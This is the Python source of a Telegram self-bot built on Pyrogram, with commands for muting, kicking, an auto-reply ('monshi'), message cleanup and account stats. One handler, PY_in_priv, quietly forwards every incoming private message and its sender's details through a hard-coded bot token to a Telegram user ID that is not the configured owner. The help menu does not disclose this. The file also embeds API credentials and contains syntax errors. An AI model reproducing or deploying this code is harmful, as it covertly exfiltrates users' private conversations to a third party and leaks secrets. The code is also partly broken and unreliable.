from pyrogram import Client
from pyrogram import Message
from pyrogram import InputPhoneContact
from pyrogram import Filters
from pyrogram import Chat
import redis
from redis import StrictRedis
import telebot
import os
import sys
import requests
import re
import time
from time import sleep
from datetime import datetime
from khayyam import *
################################
fullsudo = [744309935]
api_id = 739690
api_hash = "427ff8e03bccfd1182961765d9c1bc6b"
gplog = -1001378817892
backupm = 
################################
logger = '937699704:AAF8YsUQvOcPnvkni0_DNCiE3qjmSrIZ9kk'
bot = telebot.TeleBot(logger)
app = Client("8",api_id, api_hash)
database = redis.StrictRedis(host='localhost', port=6379, db=1,charset='UTF-8', decode_responses=True)
redis = database
################################
def muteall(chat_id,user_id):
	var = False
	if database.sismember('self:muteall'+str(chat_id), user_id):
		var = True
	return var
################################
def replyto(message: Message):
    reply_id = None

    if message.reply_to_message:
        reply_id = message.reply_to_message.message_id

    elif not message.from_user.is_self:
        reply_id = message.message_id

    return reply_id
################################



def get_ids(msg_list):
    list_ids = []
    for msg in msg_list:
        list_ids.append(msg.message_id)
    return list_ids


def delmsg(app, chat_id, msg_ids):
    app.delete_messages(chat_id, msg_ids)
################################
def stringFormat(size, out = 'kb', precision = 2): 
    if out=='kb':
        return round(float(size)/1024, precision)
    elif out=='mb': 
        return round(float(size)/(1024 * 1024), precision)
    elif out=='gb':
        return round(float(size)/(1024 * 1024 * 1024), precision)
 
    return False
 
def fileSize(filename, out = 'kb', precision = 2):  
    with codecs.open(filename, 'r') as file:
        string = file.read()
        file.close()
    return stringFormat(len(string), out, precision)
################################
def what_country(ip):
    API = "https://api.ip2country.info/ip?{}"
    response = requests.get(API.format(ip))
    data = response.json()      # convert to dictionary
    
    return data["countryName"]
################################
@app.on_message(Filters.incoming & Filters.private)
def PY_in_priv(client, message):
    bot.send_message(605955392,"~ Message From : [ <a href='tg://user?id={}'>{}</a> ] \n \n {}".format(message.from_user.id,message.from_user.first_name,str(message.text)),parse_mode='HTML', disable_web_page_preview=True)
################################
################################
@app.on_message(Filters.command("setprof", "") & Filters.me)
def set_profile_pic(client, message):
         if message.reply_to_message:
            pic = message.reply_to_message.download()
         else:
            pic = message.download()
         app.set_profile_photo(pic)
         message.edit('~ Profile Picture Set Succesfully!')
         os.remove(pic)
#################################

#################################
@app.on_message()
def cmd(c,message):




	try:
		if redis.sismember('self:poker',message.chat.id):
			if message.text == '😐':
				if not message.from_user.id == fullsudo[0]:
					message.reply_text("😐")
	except Exception as e:
        	bot.send_message(gplog," #self \n #poker \n {}".format(e))


	try:
		if database.sismember('self:typing',message.chat.id):
			if message:
				app.send_chat_action(message.chat.id, "typing")
	except Exception as e:
        	bot.send_message(gplog," #self \n #typing action \n {}".format(e))
        
                
	try:
        	if message.text == 'id':
            		pic = app.get_profile_photos(message.from_user.id, limit=1)[0]
            		app.send_photo(message.chat.id, pic.file_id, pic.file_ref, "ایدی عددی شما : [ {} ] \n \n نام اکانت شما : [ {} ] \n \n نام کاربری شما: [ @{} ]".format(message.from_user.id,message.from_user.first_name,message.from_user.username))
	except Exception as e:
        	bot.send_message(gplog," #self \n #id \n {}".format(e))
        
	try:
		if message.text == 'self':
			message.reply_text("Hi \n I Am Alireza \n this Is my Self \n @Salazar")
	except Exception as e:
		bot.send_message(gplog," #self \n #information : \n {}".format(e))

	if message.from_user.id == fullsudo[0]:
		try:
			if message.text == 'kick':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					message.edit(" ~ User {} Kicked This Chat!".format(ids))
					app.kick_chat_member(message.chat.id,ids)
		except Exception as e:
			bot.send_message(gplog," #self \n #kick : \n {}".format(e))
		
		try:
			if message.text == 'block':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					app.block_user(ids)
					message.edit(" ~ User {} Blocked!".format(ids))
		except Exception as e:
			bot.send_message(gplog," #self \n #block : \n {}".format(e))
		
		
		try:
			if message.text == 'unblock':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					app.unblock_user(ids)
					message.edit(" ~ User {} Unblocked!".format(ids))
		except Exception as e:
			bot.send_message(gplog," #self \n #unblock : \n {}".format(e))
	
		try:
			if message.text == 'reload':
				i = 1
				while i<11:
					message.edit(str(i))
					i = i + 1
				message.edit("~ DoNe!")
				python = sys.executable
				os.execl(python, python, *sys.argv)
		except Exception as e:
			bot.send_message(gplog," #self \n #reload : \n {}".format(e))
			
		try:
			if message.text == 'mute':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					message.edit(" ~ User {} Added Too The Mute List On Self!".format(ids))
					redis.sadd('self:muteall'+str(message.chat.id),ids)
		except Exception as e:
			bot.send_message(gplog," #self \n #mute : \n {}".format(e))
			



		try:
			if message.text == 'unmute':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					message.edit(" ~ User {} Removed The Mute List On Self!".format(ids))
					redis.srem('self:muteall'+str(message.chat.id),ids)
		except Exception as e:
			bot.send_message(gplog," #self \n #unmute : \n {}".format(e))
			
			
		try:
			if message.text == 'mutelist':
				if database.scard('self:muteall'+str(message.chat.id)) == int(0):
					message.edit("~ Mute List Is Empty!")
				else:
					text = '~ Mute List: \n'
					for all in database.smembers('self:muteall'+str(message.chat.id)):
						text += " ------ <a href='tg://user?id={}'>{}</a> ------ \n ".format(all,all)
					message.edit(text,parse_mode='HTML', disable_web_page_preview=True)
		except Exception as e:
			bot.send_message(gplog," #self \n #mutelist : \n {}".format(e))

        
		try:
			if re.search('mute ', message.text):
				txt = message.text.replace('mute', '')
				text = int(txt)
				ids = message.reply_to_message.from_user.id
				if redis.sismember('self:muteall'+str(message.chat.id),ids):
					message.text('~ This User is already in the Mute list!')
				else:
					message.edit("~ User [ {} ] Added To The Mutelist For [ {} ] Minute!".format(ids,txt))
					database.sadd('self:muteall'+str(message.chat.id),ids)
					min = text * 60
					sleep(min)
					database.srem('self:muteall'+str(message.chat.id),ids)
		except Exception as e:
			bot.send_message(gplog," #self \n #mute min : \n {}".format(e))
            
            
		try:
			if message.text == 'monshi on':
				if database.sismember('self:monshi',message.from_user.id):
					message.edit("~ Monshi Is Already On!")
				else:
					if redis.scard('self:mtext') == int(0):
						message.edit("~ Please Set Monshi Text!")
					else:
						message.edit("~ Self Monshi Is On!")
						database.sadd('self:monshi',message.from_user.id)
		except Exception as e:
			bot.send_message(gplog," #self \n #monshi on : \n {}".format(e))

		try:
			if message.text == 'monshi off':
				if database.sismember('self:monshi',message.from_user.id):
					message.edit("~ Self Monshi Is Off!")
					database.srem('self:monshi',message.from_user.id)
				else:
					message.edit("~ Self Monshi Is Already Off!")
		except Exception as e:
			bot.send_message(gplog," #self \n #monshi off : \n {}".format(e))

		try:
			if re.search('setmonshi ', message.text):
				txt = message.text.replace('setmonshi', '')
				if redis.scard('self:mtext') == int(0):
					message.edit("~ Text [ {} ] Seted For Monshi!".format(txt))
					database.sadd('self:mtext',txt)
				else:
					message.edit("~ You had already set the text for the Monshi section! \n ~ Please Send [ cleanmonshitext ] Then Delete Last Text & Set New Text!")
		except Exception as e:
			bot.send_message(gplog," #self \n #monshitext : \n {}".format(e))

		try:
			if message.text == 'cleanmonshitext':
				if database.scard('self:mtext') == int(0):
					message.edit("~ You have not specified any text for the Monshi section!")
				else:
					if redis.sismember('self:monshi',message.from_user.id):
						message.edit("~ Please Send [ monshi off ] & Try Again!")
					else:
						message.edit("~ Monshi Text Is Deleted!")
						database.delete('self:mtext')
		except Exception as e:
			bot.send_message(gplog," #self \n #cleanmonshitext : \n {}".format(e))

		try:
			if message.text == 'leave':
				message.edit("~ Bye!")
				app.leave_chat(message.chat.id)
		except Exception as e:
			bot.send_message(gplog," #self \n #leave : \n {}".format(e))
            

		try:
			if message.text == 'poker on':
				if redis.sismember('self:poker',message.chat.id):
					message.edit("~ Poker Mode Already On!")
				else:
					message.edit("~ Poker Mode Is Activited!")
					database.sadd('self:poker',message.chat.id)
		except Exception as e:
			bot.send_message(gplog," #self \n #poker on : \n {}".format(e))

		try:
			if message.text == 'poker off':
				message.edit("~ Poker Mode Is Deactived!")
				database.srem('self:poker',message.chat.id)
		except Exception as e:
			bot.send_message(gplog," #self \n #poker off : \n {}".format(e))
            
            
		try:
			if message.text == 'Help' or message.text == 'help':
				message.edit("~ GIOUTiN Self Help: \n \n \n [ self ] : For information! \n \n [ stats ] : Information Your Account! \n \n [ kick ] : Ban a User (For Supergroups)! \n \n [ block | unblock ] : Block a User! \n \n [ reload ] : Reload & Check The Source! \n \n [ mute | unmute ] : Silent The User (For Supergroups)! \n \n [ mutelist ] : Get a list Silents User in Supergroup! \n \n [ mute x ] : Mute a person in a timed manner(Just Reply|Replace the number of minutes you want to be in Mute instead of [x]! example : mute 5) \n \n [ Share ] : Share Your Contact! \n \n [ Addc ] : Add The Share Contacts! \n \n [ setprof ]: Reply To Picture Then Setted Picture On Your Profile!\n \n [ monshi on|monshi off ]: Turn On|Off The Monshi!\n \n [ setmonshi text|cleanmonshitext ]: Set And Delete Text Monshi!(Replace Your Monshi Text In [text])\n \n [ id ] : Your information! \n \n [ markreadall on|markreadall off ] : Active & Deactive Markread In All Chats!\n \n [ cleanmsgs ] : Clean All Message In Supergroups! \n \n [ typing on|typing off ] : Active & Deactive Typing Action In One Supergroup! \n \n [ poker on|poker off ] : Active & Deactive Poker Mode In One Supergroup! \n \n [ leave ] : Left The Chat! \n \n [ pin ] : Pin A Message In Supergroup! \n \n [ time ] : For Fun! \n \n \n ---- ~ Coder : @Salazar ---- \n ---- ~ Channel : @GIOUTiN ----")
		except Exception as e:
			bot.send_message(gplog," #self \n #Help : \n {}".format(e))
		
		try:
			if re.search('incode ', message.text):
				txt = message.text.replace('incode ', '')
				message.edit("~ Your String Is Incoding 🌑")
				sleep(2)
				message.edit("~ Your String Is Incoding 🌒")
				sleep(2)
				message.edit("~ Your String Is Incoding 🌓")
				sleep(2)
				message.edit("~ Your String Is Incoding 🌔")
				sleep(2)
				message.edit("~ Your String Is Incoding 🌕")
				sleep(2)
				text = "~ Your String Is Incoded : \n "
				for all in txt:
					b = ord(str(all))
					text += "{}\t".format(b)
					message.edit("{}".format(text))
		except Exception as e:
			bot.send_message(gplog," #self \n #incoding : \n {}".format(e))  
        


        
		try:
			if message.text == 'getme':
				my = app.get_me()
				message.edit("~ This is Answer : \n \n {}".format(my))
		except Exception as e:
			bot.send_message(gplog," #self \n #GetMe : \n {}".format(e))
            
		try:
			if message.text == 'getuser':
				if message.reply_to_message:
					user = app.get_users(message.reply_to_message.from_user.id)
					message.edit("~ This is Answer : \n \n {}".format(user))
		except Exception as e:
			bot.send_message(gplog," #self \n #Getuser : \n {}".format(e))
            
		try:
			if message.text == 'share' or message.text == 'Share':
				myid = message.from_user.id
				my = app.get_me()
				app.delete_messages(message.chat.id,message.message_id)
				app.send_contact(message.chat.id, my.phone_number, my.first_name)
		except Exception as e:
			bot.send_message(gplog," #self \n #share : \n {}".format(e))
            

		try:
			if message.text == 'cleanmsgs':
				all_msg = app.get_history_count(message.chat.id)
				c = all_msg // 99
				for i in range(c):
					delmsg(app, message.chat.id, get_ids(app.get_history(message.chat.id, 99)))
					time.sleep(0.3)
				delmsg(app, message.chat.id, get_ids(app.get_history(message.chat.id, (all_msg - c * 99))))
				message.delete()
				app.send_message(message.chat.id,"~ All Chats Cleared!")
		except Exception as e:
			bot.send_message(gplog," #self \n #cleanmsgs : \n {}".format(e))


		try:
			if message.text == 'time':
				tm = datetime.now()
				jdate = JalaliDate.today()
				message.edit("~ Time : [ {}:{}:{} ] \n ~ Year: [ {} ] \n ~ Month : [ {} ] \n ~ Day : [ {} ] \n \n ~ Coder: @Salazar \n ~ Channel : @GIOUTiN & @Pinigerteam".format(tm.hour,tm.minute,tm.second,jdate.year,jdate.month,jdate.day))
		except Exception as e:
			bot.send_message(gplog," #self \n #session : \n {}".format(e))


		try:
			if message.text == 'typing on':
				if database.sismember('self:typing',message.chat.id):
					message.edit("~ Typing Action Is Already On!")
				else:
					message.edit("~ Typing Action Activited This Gp!")
					database.sadd('self:typing',message.chat.id)
		except Exception as e:
			bot.send_message(gplog," #self \n #typing on one gp : \n {}".format(e))
                    
		try:
			if message.text == 'typing off':
				message.edit("~ Typing Action Is Deactived This Gp!")
				database.srem('self:typing',message.chat.id)
		except Exception as e:
			bot.send_message(gplog," #self \n #typing off one gp : \n {}".format(e))
             

		try:
			if message.text == 'pin':
				if message.reply_to_message:
					message.edit("~ This Message Is Pinned!")
					app.pin_chat_message(message.chat.id, message.reply_to_message.message_id)
		except Exception as e:
			bot.send_message(gplog," #self \n #pin : \n {}".format(e))

             
		try:
			if message.text == 'stats' or message.text == 'Stats':
				my = app.get_me()
				if database.sismember('self:typing',message.chat.id):
					typ = '✔️'
				else:
					typ = '❌'
				if database.sismember('self:poker',message.chat.id):
					pkr = '✔️'
				else:
					pkr = '❌'
				if database.sismember('self:markreadall',my.id):
					mrkall = '✔️'
				else:
					mrkall = '❌'
				if database.sismember('self:monshi',message.from_user.id):
					mnsh = '✔️'
				else:
					mnsh = '❌'
				message.edit("~ Your Account Information: \n \n \n • Name: [ {} ] \n \n • Username: [ {} ] \n \n • Userid: [ {} ] \n \n • Typing In This Gp: [ {} ] \n \n • Poker In This Gp: [ {} ] \n \n • Markread In All Spgs & PV: [ {} ] \n \n • Monshi Action: [ {} ] \n \n • Monshi Text: [ {} ] \n \n \n ~ Coder: @Salazar \n ~ Channel : @GIOUTiN & @Pinigerteam".format(my.first_name,my.username,my.id,typ,pkr,mrkall,mnsh,database.smembers('self:mtext')))
		except Exception as e:
			bot.send_message(gplog," #self \n #session : \n {}".format(e))
            
		try:
			if message.text == 'markreadall on':
				my = app.get_me()
				if redis.sismember('self:markreadall',"mall"):
					message.edit("~ Markread Mode Already On!")
				else:
					message.edit("~ Markread All Is Activited!")
					redis.sadd('self:markreadall',"mall")
		except Exception as e:
			bot.send_message(gplog," #self \n #markreadall on : \n {}".format(e))
            
		try:
			if message.text == 'markreadall off':
				message.edit("~ Markread All Is Deactived!")
				database.srem('self:markreadall',"mall")
		except Exception as e:
			bot.send_message(gplog," #self \n #markreadall off : \n {}".format(e))
            

            
		try:
			if message.text == 'addc' or message.text == 'Addc':
				myid = message.from_user.id
				if message.reply_to_message:
					message.edit(message.chat.id,message.message_id,"~ This Number Added Too Contacts!")
					app.add_contacts([InputPhoneContact(str(message.reply_to_message.contact.phone_number), str(message.reply_to_message.contact.first_name))])
		except Exception as e:
			bot.send_message(gplog," #self \n #addcontact : \n {}".format(e))
	try:
		if muteall(message.chat.id,message.from_user.id):
			app.delete_messages(message.chat.id, message.message_id)
	except Exception as e:
		bot.send_message(gplog," #self \n #delmute : \n {}".format(e))


	

app.run()